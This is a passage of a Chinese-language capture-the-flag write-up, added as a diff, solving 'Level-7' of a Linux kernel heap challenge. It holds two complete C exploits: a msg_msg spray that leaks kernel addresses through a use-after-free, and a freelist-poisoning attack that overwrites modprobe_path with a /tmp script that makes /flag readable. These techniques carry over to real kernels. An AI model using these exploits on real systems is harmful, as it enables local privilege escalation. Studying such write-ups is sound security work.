@@ -1244,3 +1244,254 @@ int main() {
     return 0;
 }
 ```
+
+### Level-7
+
+bro把kernel exploitation玩成了赌博老虎机（
+
+level-3的话说早了，这才是最抽象的逆天exp……题目设置和上一题差不多，但是设备不再将flag读到堆上
+
+先看怎么泄漏地址。我想着msg_msg里应该有些指针，于是抄了上一题的脚本，看看究竟有些啥。结果发现里面只有些kernel堆地址，而且调试发现这些地址和当前slab差得挺远的，偏移也不固定。我上哪去找kernel leak？有人提到了这篇文章： https://n132.github.io/2024/02/09/IPS.html ，说利用msg_msg的`msg_msg.next`可以实现任意地址读，前提是读取的地址处为null，不然free_msg会free `msg_msg.next`，容易panic（不知道加MSG_COPY可不可以阻止这点？不过即使这样也不好搞，不确定目标地址处的指针指到什么地方去）。之前提到的kernel固定地址里有可用的kernel指针，但非常不巧的是，里面不存在null
+
+逛[社区](https://discord.com/channels/750635557666816031/1232103540160204870)发现确实可以用msg_msg泄漏，但是要碰概率。什么？让我试试
+```c
+#define _GNU_SOURCE 
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+uint64_t binary_string_to_u64(const char *binary_str) {
+    uint64_t result;
+    memcpy(&result, binary_str, 8);
+    return result;
+}
+void find_8byte_strings(const void *buffer, size_t buffer_size) {
+    const char *ptr = (const char *)buffer;
+    size_t num_strings = buffer_size / 8;
+    for (size_t i = 0; i < num_strings; i++) {
+        const char *current_str = ptr + (i * 8);
+        if ((unsigned char)current_str[7] == 0xff&&(unsigned char)current_str[6]==0xff&&(unsigned char)current_str[5]==0xff) {
+            printf("Found 8-byte string at offset %zu: ", i * 8);
+            printf("%llx\n",binary_string_to_u64(current_str));
+        }
+    }
+}
+int main() {
+    int ret;
+    unsigned long arg[2];
+    char buf[0x1000];
+    memset(buf,0,sizeof(buf));
+    arg[0]=(unsigned long)buf;
+    arg[1]=0x30;
+    int spray_count=8;
+    int fd=open("/proc/kheap", O_RDWR);
+    int ms_qid[spray_count];
+    for (int i = 0; i < spray_count; i++)
+    {
+        ms_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+        if (ms_qid[i] < 0)
+        {
+            puts("[x] msgget!");
+            return -1;
+        }
+    }
+    ioctl(fd,0x5703,arg);
+    for (int i = 0; i < spray_count; i++)
+    {
+        memset(buf, 'A' + i, sizeof(buf));
+        ret = msgsnd(ms_qid[i], buf, 0x1d0 - 0x30, 0);
+        if (ret < 0)
+        {
+            puts("[x] msgsnd!");
+            return -1;
+        }
+    }
+    memset(buf, 0, sizeof(buf));
+    unsigned long *ul_buf = (unsigned long *)buf;
+    int offset=0;
+    ul_buf[offset++]=0xfffffe0000000500;
+    ul_buf[offset++]=0xfffffe0000000500;
+    ul_buf[offset++]=0x4141414141414141;
+    ul_buf[offset++]=0x1000-0x30;
+    ul_buf[offset++]=0;
+    ul_buf[offset++]=0xfffffe0000000500;
+    ioctl(fd,0x5701,arg);
+    for (int i = 0; i < spray_count; i++)
+    {
+        ret = msgrcv(ms_qid[i], buf, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
+        if (ret < 0)
+        {
+            printf("[x] msgrcv!");
+            return -1;
+        }
+        find_8byte_strings(buf,sizeof(buf));
+    }
+    return 0;
+}
+```
+需要多次运行上述脚本。运气好的情况下一次就行，运气不好的话几十次都不行。这个方法不稳定中透露出一丝稳定，因为最后基本都可以看到一个以`8e0`结尾的地址（有时是其他的kernel地址，这个情况再多运行几次后就能看到期望的8e0了）
+
+之后我一直苦于不知道怎么进行下一步。曾在某处看到msg_msg可以实现任意地址写，但后续发现需要借用userfault fd，在这题（6.7.9）已经不能用了。pipe_buffer又不在kmalloc-cg-512。到最后还是要顶着hardened freelist搞fd劫持。效仿level-5的做法，尝试获取`random^ptr_addr^null`的值，然后把modprobe的地址链进去
+```c
+#define _GNU_SOURCE
+#include <stdbool.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <inttypes.h>
+void prepare_modprobe_files() {
+    system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
+    system("chmod +x /tmp/x");
+    system("printf '\xff\xff\xff\xff' > /tmp/dummy");
+    system("chmod +x /tmp/dummy");
+}
+void u64_to_binary_string(uint64_t num, char *output) {
+    memcpy(output, &num, 8);
+}
+uint64_t binary_string_to_u64(const char *binary_str) {
+    uint64_t result;
+    memcpy(&result, binary_str, 8);
+    return result;
+}
+void find_8byte_strings(const void *buffer, size_t buffer_size) {
+    const char *ptr = (const char *)buffer;
+    size_t num_strings = buffer_size / 8;
+    for (size_t i = 0; i < num_strings; i++) {
+        const char *current_str = ptr + (i * 8);
+        if ((unsigned char)current_str[0] !=0) {
+            printf("Found 8-byte string at offset %zu: ", i * 8);
+            printf("%llx\n",binary_string_to_u64(current_str));
+        }
+    }
+}
+int main() {
+    prepare_modprobe_files();
+    int ret;
+    unsigned long arg[2];
+    char buf[0x1000];
+    memset(buf,0,sizeof(buf));
+    arg[0]=(unsigned long)buf;
+    arg[1]=0x30;
+    //一个slab 8个slot，有一个slot会被复用（uaf），因此有7+2-1=8
+    //不过我不确定这是不是必须的……有可能是我在和空气斗智斗勇
+    int spray_count=7;
+    int fd_count=2;
+    int fds[fd_count];
+    for(int i=0;i<fd_count;i++){
+        fds[i]=open("/proc/kheap", O_RDWR);
+    }
+    int ms_qid[spray_count];
+    for (int i = 0; i < spray_count; i++)
+    {
+        ms_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+        if (ms_qid[i] < 0)
+        {
+            puts("[x] msgget!");
+            return -1;
+        }
+    }
+    ioctl(fds[0],0x5703,arg);
+    for (int i = 0; i < spray_count; i++)
+    {
+        memset(buf, 'A' + i, sizeof(buf));
+        ret = msgsnd(ms_qid[i], buf, 0x1d0 - 0x30, 0);
+        if (ret < 0)
+        {
+            puts("[x] msgsnd!");
+            return -1;
+        }
+    }
+    memset(buf, 0, sizeof(buf));
+    unsigned long *ul_buf = (unsigned long *)buf;
+    int offset=0;
+    ul_buf[offset++]=0xfffffe0000000500;
+    ul_buf[offset++]=0xfffffe0000000500;
+    ul_buf[offset++]=0x4141414141414141;
+    ul_buf[offset++]=0x1000-0x30;
+    ul_buf[offset++]=0;
+    ul_buf[offset++]=0xfffffe0000000500;
+    ioctl(fds[0],0x5701,arg);
+    arg[1]=0x1d0;
+    //marker，后续泄漏的内容中被一堆0x7e包裹着的就是目标
+    memset(buf, 0x7e, sizeof(buf));
+    ioctl(fds[1],0x5701,arg);
+    //这个堆块是freelist里的第一个堆块，因此它的fd就是上文说的 random^ptr_addr^null
+    ioctl(fds[1],0x5703,arg);
+    for (int i = 0; i < spray_count; i++)
+    {
+        ret = msgrcv(ms_qid[i], buf, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
+        if (ret < 0)
+        {
+            printf("[x] msgrcv!");
+            return -1;
+        }
+        find_8byte_strings(buf,sizeof(buf));
+    }
+    uint64_t num;
+    printf("Done\n");
+    //不知道怎么自动化了，干脆直接手动（
+    if (scanf("%" SCNx64, &num) == 1) {
+        printf("读取到的数值: 0x%" PRIx64 "\n", num);
+    } else {
+        printf("输入格式错误！\n");
+        exit(0);
+    }
+    char output[8];
+    uint64_t modprobe=0xffffffff83e198e0+0x925be0-0x40;
+    uint64_t modprobe_encrypted=num^modprobe;
+    u64_to_binary_string(modprobe_encrypted,output);
+    for (size_t i = 0; i < 0x1d0; i += 8) {
+        memcpy(&buf[i], output, 8);
+    }
+    //uaf修改fd
+    ioctl(fds[1],0x5701,arg);
+    int victim_count=8;
+    int victims[victim_count];
+    memset(buf, 0, sizeof(buf));
+    strcpy(buf+0x40,"/tmp/x");
+    int off=40;
+    ul_buf[off++]=0x0000003200000000;
+    ul_buf[off++]=modprobe+0x148;
+    ul_buf[off++]=modprobe+0x148;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe+0x170;
+    ul_buf[off++]=modprobe+0x170;
+    ul_buf[off++]=1;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe-0x48172d;
+    ul_buf[off++]=modprobe+0x220;
+    ul_buf[off++]=0x000001a400000004;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe-0x1a0d0a0;
+    ul_buf[off++]=0;
+    //实践中发现没法确认modprobe在何时被拿出来，只知道最多八次一定能拿到modprobe
+    for(int i=0;i<victim_count;i++){
+        victims[i]=open("/proc/kheap", O_RDWR);
+        ioctl(victims[i],0x5701,arg);
+        //把触发逻辑放到for循环里是因为，拿到modprobe后的下一次kmalloc会使kernel panic，毕竟fd不对了。放在里面就能确保kernel在panic前先把flag吐出来
+        system("/tmp/dummy");
+        system("cat /flag");
+    }
+    return 0;
+}
+```
+有时候会发现得不到期望的fd值。这个时候只能重启vm了。这个脚本只要一运行，kernel就一定会panic。区别在于panic前能不能拿到flag（
+
+结果两个脚本都是概率脚本。是时候看看自己的运气了（
+
+level-8我用一样的exp就过了。结果描述里的“no more USERCOPY”指的是设备里多了个`__check_object_size`啊？做之前我以为是不能用msg_msg越界读了，头疼，毕竟我整个exp都是基于msg_msg的。此时新的问题来了：难道我level-7用的是非预期解？有使`_copy_from_user`越界读用户输入的方法？看社区里大部分人都是用差不多的exp连过两题。我们永远都没法知道预期解是啥了（
